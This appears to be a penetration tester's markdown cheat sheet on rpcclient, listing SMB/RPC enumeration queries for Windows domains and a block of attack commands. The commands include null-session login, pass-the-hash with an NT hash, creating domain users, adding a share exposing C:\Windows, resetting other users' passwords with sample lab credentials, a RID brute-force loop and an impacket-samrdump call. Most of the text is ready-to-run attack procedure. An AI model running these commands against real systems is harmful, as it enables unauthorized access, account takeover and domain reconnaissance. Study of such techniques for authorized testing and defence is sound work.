## Tips

- https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf

## Enumeration

### Query

| **Query** | **Description** |
| --- | --- |
| `srvinfo` | Server information. |
| `enumdomains` | Enumerate all domains that are deployed in the network. |
| `querydominfo` | Provides domain, server, and user information of deployed domains. |
| `netshareenumall` | Enumerates all available shares. |
| `netsharegetinfo <share>` | Provides information about a specific share. |
| `enumdomusers` | Enumerates all domain users. |
| `queryuser <RID>` | Provides information about a specific user. |
| `lookupnames $username` |  |
| `getdompwinfo` |  |
| `getusrdompwinfo 1000` |  |
|  |  |

### Commands

```bash
# Null Authentication
rpcclient -U "" -N <IP>

# Pass the Hash
rpcclient -U "" $IP --pw-nt-hash $HASH

# User/Group Enum
rpcclient $> enumdomusers
user:[wook] rid:[0x3e8]

rpcclient $> queryuser 0x3e8
rpcclient $> querygroup 0x201

# Create a new user
rpcclient $> createdomuser $username
rpcclient $> setuserinfo2 $username 24 '$newpassword'

# Create a new share
rpcclient $> netshareadd "C:\Windows" "Windows" 10 "Windows Share"

# Change a user password
#1)
rpcclient $> chgpasswd3 $username $oldpass $newpass

#2)
rpcclient //$IP -U domain/user%pwd
setuserinfo2 <user> <level> <pwd>
setuserinfo2 MOLLY.SMITH 23 'Password123!'

#3) net rpc password to reset password for user
net rpc password ewalters "Hacksmarter123!" -U "RSmith%IhateEric2" -S lab.trusted
```

### Brute Force User RIDs

```bash
for i in $(seq 500 1100);do rpcclient -N -U "" $IP -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```

```bash
impacket-samrdump $DOMAIN/$USER:$PWD@$IP
```